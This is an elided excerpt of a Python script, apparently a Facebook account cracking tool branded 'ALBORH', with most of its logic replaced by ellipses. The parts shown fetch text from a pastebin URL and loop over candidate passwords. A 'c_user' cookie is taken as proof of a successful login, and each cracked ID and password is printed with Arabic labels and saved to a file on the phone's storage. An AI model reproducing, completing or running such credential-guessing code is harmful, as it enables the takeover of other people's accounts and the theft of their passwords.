...
def subc():
   ...
   ses=requests.get("https://pastebin.com/n1kLMxFe").text
...
def xyz():
    ...
    print('           \x1b[97m[\033[37;41m  ALBORH❤   \033[0;m] ')
...
def Tabii():
    ...
    print(f"          \x1b[97m[\033[37;41m  ALBORH WENT \033[0;m]")
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print(f'\r{Red}[×]--------------------[ALBORH-CP😢]---------------------[×]\nﻢﻗﺮﻟﺍ : '+uid+'\nﻱﺪﻳﻻﺍ   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')

                open('/sdcard/mohamed-CP.txt', 'a').write(cid+' | '+ps+'\n')
